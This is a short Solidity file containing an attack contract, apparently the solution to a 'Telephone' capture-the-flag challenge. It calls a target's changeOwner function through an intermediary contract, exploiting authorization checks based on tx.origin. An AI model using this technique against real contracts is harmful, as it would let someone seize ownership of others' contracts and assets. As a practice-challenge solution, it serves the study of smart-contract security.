// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract TelephoneAttack {
  function attack(address _contract) public returns (bool) {
    (bool success, ) = _contract.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
    return success;
  }
}